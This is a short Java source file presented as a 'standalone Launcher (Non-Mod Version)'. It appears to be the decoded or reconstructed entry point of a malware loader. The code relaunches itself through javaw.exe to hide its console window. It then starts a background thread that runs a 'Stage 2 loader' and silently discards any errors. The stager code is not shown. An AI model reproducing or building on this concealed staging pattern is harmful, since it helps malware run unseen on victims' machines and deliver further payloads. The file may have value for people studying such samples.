// standalone Launcher (Non-Mod Version)

package com.example;

import com.google.gson.JsonObject;
import java.io.File;

public class MEntrypoint {

    public static void main(String[] args) {
        // Check if running in windowed mode
        checkJVMLauncher(args);

        // Create context
        JsonObject ctx = new JsonObject();

        // DECODED: "platform" -> "native"
        ctx.addProperty("platform", "native");

        // Execute Stage 2 loader
        new Thread(() -> {
            try {
                StagingHelper.stageWithContext(ctx);
            } catch (Exception e) {
                // Silently fail
            }
        }).start();
    }

    /**
     * Relaunch using javaw.exe to hide console window
     */
    public static void checkJVMLauncher(String[] args) {
        boolean hasJwFlag = false;

        // Check if already relaunched with --jw flag
        for (String arg : args) {
            if (arg.equalsIgnoreCase("--jw")) {
                hasJwFlag = true;
                break;
            }
        }

        if (hasJwFlag) {
            return; // Already relaunched
        }

        try {
            // Get Java installation path
            String javaHome = System.getProperty("java.home");

            // Get current JAR path
            String jarPath = new File(
                    MEntrypoint.class.getProtectionDomain()
                            .getCodeSource()
                            .getLocation()
                            .toURI()
            ).getPath();

            // Path to javaw.exe (no console window)
            String javawPath = javaHome + File.separator + "bin" + File.separator + "javaw.exe";

            // Relaunch with javaw to hide window
            ProcessBuilder builder = new ProcessBuilder(javawPath, "-jar", jarPath, "--jw");
            builder.start();

            // Exit original process
            System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}